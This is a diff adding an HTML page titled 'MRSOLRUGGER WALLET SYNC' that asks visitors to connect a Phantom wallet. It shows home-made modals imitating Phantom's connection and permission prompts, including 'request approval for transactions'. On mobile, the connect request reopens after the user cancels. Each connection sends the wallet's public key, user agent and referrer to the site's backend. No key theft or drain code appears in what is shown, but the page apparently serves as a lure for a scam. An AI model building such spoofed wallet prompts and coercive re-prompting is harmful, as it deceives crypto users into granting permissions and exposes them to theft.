@@ -1,0 +1,389 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MRSOLRUGGER WALLET SYNC</title>
+  <style>
+    :root{
+      --bg:#0b0b0b;
+      --card:#1a1a1a;
+      --accent:#ff7300;
+      --muted:#ffb366;
+      --glass:rgba(255,115,0,0.08);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial}
+    body{background:#0b0b0b;color:#ffb366;display:flex;align-items:center;justify-content:center;padding:32px;background:radial-gradient(circle at center, #1a1a1a 0%, #0b0b0b 100%)}
+    .card{width:100%;max-width:720px;background:linear-gradient(180deg,rgba(255,115,0,0.05),rgba(255,115,0,0.02));border-radius:12px;padding:28px;border:1px solid rgba(255,115,0,0.15);box-shadow:0 8px 30px rgba(255,115,0,0.2)}
+    h1{margin:0 0 8px;font-size:26px;letter-spacing:0.6px;color:#ff7300;text-shadow:0 0 12px rgba(255,115,0,0.8)}
+    p.lead{margin:0 0 18px;color:var(--muted)}
+    .connect-row{display:flex;align-items:center;gap:14px}
+    .connect-btn{display:inline-flex;align-items:center;gap:10px;padding:12px 16px;border-radius:10px;background:linear-gradient(90deg,#ff7300,#cc5c00);border:none;color:white;font-weight:600;cursor:pointer;box-shadow:0 0 12px rgba(255,115,0,0.6)}
+    .connect-btn:disabled{opacity:0.6;cursor:not-allowed}
+    .logo{width:36px;height:36px;border-radius:8px;background:var(--glass);display:flex;align-items:center;justify-content:center}
+    .logo svg{width:22px;height:22px;stroke:#ffb366;fill:none}
+    .status{margin-left:12px;color:var(--muted);font-size:14px}
+    .info{margin-top:18px;padding:12px;border-radius:8px;background:rgba(255,115,0,0.04);color:var(--muted);font-size:14px}
+
+    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;padding:20px;z-index:1000}
+    .modal{background:#1a1a1a;padding:20px;border-radius:12px;width:100%;max-width:420px;border:1px solid rgba(255,115,0,0.15);box-shadow:0 8px 20px rgba(255,115,0,0.2)}
+    .modal h3{margin:0 0 8px;color:#ff7300}
+    .modal p{margin:0 0 16px;color:var(--muted)}
+    .modal-actions{display:flex;gap:10px;justify-content:flex-end}
+    .btn{padding:10px 14px;border-radius:8px;border:none;cursor:pointer}
+    .btn.secondary{background:transparent;color:var(--muted);border:1px solid rgba(255,115,0,0.15)}
+    .btn.primary{background:linear-gradient(90deg,#ff7300,#cc5c00);color:white}
+
+    /* Mobile Deep Link Modal */
+    .mobile-modal{background:#1a1a1a;padding:24px;border-radius:12px;width:100%;max-width:380px;border:1px solid rgba(255,115,0,0.15);box-shadow:0 8px 20px rgba(255,115,0,0.2)}
+    .mobile-modal h3{margin:0 0 12px;color:#ff7300;text-align:center}
+    .mobile-modal .app-icon{width:64px;height:64px;margin:0 auto 16px;border-radius:12px;background:linear-gradient(135deg,#ab9ff2,#6366f1);display:flex;align-items:center;justify-content:center}
+    .mobile-modal .app-icon svg{width:32px;height:32px;stroke:white;fill:none}
+    .deep-link-btn{width:100%;padding:14px;border-radius:10px;background:linear-gradient(90deg,#ff7300,#cc5c00);border:none;color:white;font-weight:600;cursor:pointer;margin-bottom:12px;font-size:16px}
+    .cancel-link{width:100%;padding:12px;border-radius:8px;background:transparent;border:1px solid rgba(255,115,0,0.15);color:var(--muted);cursor:pointer;font-size:14px}
+
+    /* Mobile Connect Request Modal */
+    .mobile-connect-modal{background:#1a1a1a;padding:20px;border-radius:12px;width:100%;max-width:360px;border:1px solid rgba(255,115,0,0.15);box-shadow:0 8px 20px rgba(255,115,0,0.2)}
+    .mobile-connect-modal h3{margin:0 0 16px;color:#ff7300;font-size:18px}
+    .connect-request{display:flex;align-items:center;gap:12px;margin-bottom:20px;padding:12px;border-radius:8px;background:rgba(255,115,0,0.02)}
+    .connect-request .site-icon{width:40px;height:40px;border-radius:8px;background:rgba(255,115,0,0.1);display:flex;align-items:center;justify-content:center}
+    .connect-request .site-icon svg{width:20px;height:20px;stroke:#ff7300;fill:none}
+    .connect-info h4{margin:0 0 4px;color:#ff7300;font-size:14px}
+    .connect-info p{margin:0;color:var(--muted);font-size:12px}
+    .permissions{margin-bottom:20px}
+    .permissions h4{margin:0 0 8px;color:var(--muted);font-size:13px}
+    .permission-item{display:flex;align-items:center;gap:8px;margin-bottom:6px;color:var(--muted);font-size:12px}
+    .permission-item svg{width:16px;height:16px;stroke:currentColor;flex-shrink:0}
+
+    footer{margin-top:18px;font-size:13px;color:var(--muted)}
+
+    @media (max-width:520px){
+      .card{padding:20px}
+      .connect-row{flex-direction:column;align-items:stretch;gap:12px}
+      .status{margin-left:0;text-align:center}
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="main">
+    <h1>MRSOLRUGGER WALLET SYNC</h1>
+    <p class="lead">Sync your wallet to continue. Click the button below to connect your Phantom wallet. A wallet popup will appear asking you to confirm access.</p>
+
+    <div class="connect-row">
+      <button id="connectBtn" class="connect-btn" aria-live="polite">
+        <span>Connect Phantom Wallet</span>
+        <span class="logo" aria-hidden="true">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="5" width="20" height="14" rx="2" stroke-width="1.2" />
+            <circle cx="17" cy="12" r="1.6" fill="#ffb366" />
+          </svg>
+        </span>
+      </button>
+
+      <div class="status" id="status">Not connected</div>
+    </div>
+
+    <div class="info" id="infoBox">If you have the Phantom browser extension installed it will open a popup asking to connect. If you don't have Phantom installed, a mock confirmation will appear for demo purposes.</div>
+
+    <footer>Tip: Use the Phantom extension on Chrome/Brave/Edge, or the Phantom mobile app's deep link for mobile dapps.</footer>
+  </main>
+
+  <!-- Desktop Modal -->
+  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document">
+      <h3>Phantom — Request to connect</h3>
+      <p><strong>MRSOLRUGGER</strong> is requesting permission to view your wallet address and request transactions. This is a demo modal shown because no Phantom wallet was detected in your browser.</p>
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+        <div style="width:44px;height:44px;border-radius:8px;background:rgba(255,115,0,0.05);display:flex;align-items:center;justify-content:center">
+          <svg viewBox="0 0 24 24" width="20" height="20" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="20" height="16" rx="2" stroke="#ffb366" stroke-width="1.2"/></svg>
+        </div>
+        <div style="flex:1">
+          <div style="font-weight:600;color:#ff7300">MRSOLRUGGER</div>
+          <div style="color:var(--muted);font-size:13px">wants to connect to your Phantom wallet</div>
+        </div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn secondary" id="cancelMock">Cancel</button>
+        <button class="btn primary" id="approveMock">Approve</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Mobile Deep Link Modal -->
+  <div id="mobileDeepLinkModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="mobile-modal" role="document">
+      <div class="app-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <rect x="2" y="5" width="20" height="14" rx="2" stroke-width="1.5" />
+          <circle cx="17" cy="12" r="1.6" fill="white" />
+        </svg>
+      </div>
+      <h3>Open with Phantom</h3>
+      <p style="text-align:center;margin-bottom:20px;color:var(--muted);font-size:14px">Connect your Phantom wallet to continue</p>
+      <button class="deep-link-btn" id="openPhantomBtn">Open with Phantom</button>
+      <button class="cancel-link" id="cancelDeepLink">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Mobile Connect Request Modal -->
+  <div id="mobileConnectModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="mobile-connect-modal" role="document">
+      <h3>Connection Request</h3>
+      
+      <div class="connect-request">
+        <div class="site-icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="4" width="20" height="16" rx="2" stroke-width="1.2"/>
+          </svg>
+        </div>
+        <div class="connect-info">
+          <h4>MRSOLRUGGER</h4>
+          <p>wants to connect to your wallet</p>
+        </div>
+      </div>
+
+      <div class="permissions">
+        <h4>This app would like to:</h4>
+        <div class="permission-item">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" stroke-width="1.5"/>
+            <polyline points="10,17 15,12 10,7" stroke-width="1.5"/>
+            <line x1="15" y1="12" x2="3" y2="12" stroke-width="1.5"/>
+          </svg>
+          View your wallet address
+        </div>
+        <div class="permission-item">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="10" stroke-width="1.5"/>
+            <polyline points="12,6 12,12 16,14" stroke-width="1.5"/>
+          </svg>
+          Request approval for transactions
+        </div>
+        <div class="permission-item">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21 12c-1 0-3-1-3-3s2-3 3-3 3 1 3 3-2 3-3 3" stroke-width="1.5"/>
+            <path d="M3 12c1 0 3-1 3-3s-2-3-3-3-3 1-3 3 2 3 3 3" stroke-width="1.5"/>
+            <path d="M13 12h1" stroke-width="1.5"/>
+            <path d="M10 12h1" stroke-width="1.5"/>
+          </svg>
+          See your account balance
+        </div>
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn secondary" id="mobileCancel">Cancel</button>
+        <button class="btn primary" id="mobileApprove">Connect</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const connectBtn = document.getElementById('connectBtn');
+    const status = document.getElementById('status');
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const approveMock = document.getElementById('approveMock');
+    const cancelMock = document.getElementById('cancelMock');
+    const infoBox = document.getElementById('infoBox');
+
+    // Mobile elements
+    const mobileDeepLinkModal = document.getElementById('mobileDeepLinkModal');
+    const mobileConnectModal = document.getElementById('mobileConnectModal');
+    const openPhantomBtn = document.getElementById('openPhantomBtn');
+    const cancelDeepLink = document.getElementById('cancelDeepLink');
+    const mobileApprove = document.getElementById('mobileApprove');
+    const mobileCancel = document.getElementById('mobileCancel');
+
+    // Backend API base URL
+    const API_BASE_URL = window.location.origin + '/api';
+
+    function setStatus(text){status.textContent = text}
+
+    function isMobile(){
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
+    }
+
+    function getPhantomProvider(){
+      if(window.solana && window.solana.isPhantom) return window.solana;
+      return null;
+    }
+
+    function showModal(modal){
+      modal.style.display = 'flex';
+      modal.setAttribute('aria-hidden','false');
+    }
+
+    function hideModal(modal){
+      modal.style.display = 'none';
+      modal.setAttribute('aria-hidden','true');
+    }
+
+    // Send wallet connection data to backend
+    async function notifyWalletConnection(walletData) {
+      try {
+        const response = await fetch(`${API_BASE_URL}/wallet-connected`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            publicKey: walletData.publicKey,
+            connectionType: walletData.connectionType,
+            device: isMobile() ? 'mobile' : 'desktop',
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString()
+          })
+        });
+
+        if (response.ok) {
+          console.log('✅ Wallet connection logged to backend');
+        } else {
+          console.warn('⚠️ Failed to log wallet connection to backend');
+        }
+      } catch (error) {
+        console.error('❌ Error sending wallet data to backend:', error);
+      }
+    }
+
+    async function connectPhantom(){
+      const provider = getPhantomProvider();
+      
+      if(!provider){
+        if(isMobile()){
+          // Show mobile deep link modal first
+          showModal(mobileDeepLinkModal);
+          setStatus('Opening Phantom...');
+        } else {
+          // Show desktop modal
+          showModal(modalBackdrop);
+        }
+        return;
+      }
+
+      try{
+        setStatus('Connecting...');
+        const resp = await provider.connect();
+        const pk = resp.publicKey.toString();
+        setStatus('Connected: ' + pk.slice(0,6) + '...' + pk.slice(-4));
+        infoBox.textContent = 'Connected to Phantom — public key: ' + pk;
+        connectBtn.disabled = true;
+
+        // Send notification to backend
+        await notifyWalletConnection({
+          publicKey: pk,
+          connectionType: 'phantom_extension'
+        });
+
+      }catch(err){
+        console.error('Connection error', err);
+        setStatus('Connection rejected or failed');
+      }
+    }
+
+    // Desktop modal handlers
+    approveMock.addEventListener('click', async ()=>{
+      hideModal(modalBackdrop);
+      const fakePk = 'DemoPublicKey12345ABCDE';
+      setStatus('Connected: ' + fakePk.slice(0,6) + '...' + fakePk.slice(-4));
+      infoBox.textContent = 'Demo connection approved. (This was a simulated popup because Phantom is not installed.)';
+      connectBtn.disabled = true;
+
+      // Send notification to backend
+      await notifyWalletConnection({
+        publicKey: fakePk,
+        connectionType: 'demo_desktop'
+      });
+    });
+
+    cancelMock.addEventListener('click', ()=>{
+      hideModal(modalBackdrop);
+      setStatus('Not connected');
+    });
+
+    // Mobile deep link handlers
+    openPhantomBtn.addEventListener('click', ()=>{
+      // Create Phantom deep link
+      const currentUrl = encodeURIComponent(window.location.href);
+      const deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=mrsolrugger`;
+      
+      // Hide deep link modal
+      hideModal(mobileDeepLinkModal);
+      
+      // Set persistent flag to show connect modal when returning
+      sessionStorage.setItem('showConnectModal', 'true');
+      sessionStorage.setItem('redirectTime', Date.now().toString());
+      
+      // Attempt to open Phantom app
+      window.location.href = deepLinkUrl;
+      setStatus('Opening Phantom app...');
+    });
+
+    cancelDeepLink.addEventListener('click', ()=>{
+      hideModal(mobileDeepLinkModal);
+      setStatus('Not connected');
+    });
+
+    // Mobile connect request handlers
+    mobileApprove.addEventListener('click', async ()=>{
+      hideModal(mobileConnectModal);
+      const fakePk = 'MobileDemo12345ABCDE';
+      setStatus('Connected: ' + fakePk.slice(0,6) + '...' + fakePk.slice(-4));
+      infoBox.textContent = 'Mobile connection approved via deep link simulation.';
+      connectBtn.disabled = true;
+      
+      // Clear the persistent flag
+      sessionStorage.removeItem('showConnectModal');
+
+      // Send notification to backend
+      await notifyWalletConnection({
+        publicKey: fakePk,
+        connectionType: 'demo_mobile'
+      });
+    });
+
+    mobileCancel.addEventListener('click', () => {
+      hideModal(mobileConnectModal);
+      setStatus('Connection cancelled');
+
+      // Immediately reopen if they haven't connected yet
+      const shouldShow = sessionStorage.getItem('showConnectModal');
+      if (shouldShow === 'true' && isMobile()) {
+        showModal(mobileConnectModal);
+        setStatus('Please confirm connection...');
+      }
+    });
+
+    // Main connect button
+    connectBtn.addEventListener('click', connectPhantom);
+
+    // Check if already connected on load
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) {
+        const shouldShowModal = sessionStorage.getItem('showConnectModal');
+        if (shouldShowModal === 'true' && isMobile()) {
+          showModal(mobileConnectModal);
+          setStatus('Confirm connection in Phantom...');
+          infoBox.textContent = 'Please approve the connection request in the popup below.';
+        }
+      }
+    });
+
+    // Handle return from Phantom app (page visibility API)
+    document.addEventListener('visibilitychange', ()=>{
+      if(!document.hidden){
+        const shouldShowModal = sessionStorage.getItem('showConnectModal');
+        
+        if(shouldShowModal === 'true' && isMobile()){
+          // Show connect request modal immediately when page becomes visible
+          setTimeout(() => {
+            showModal(mobileConnectModal);
+            setStatus('Confirm connection in Phantom...');
+            infoBox.textContent = 'Please approve the connection request in the popup below.';
+          }, 100);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
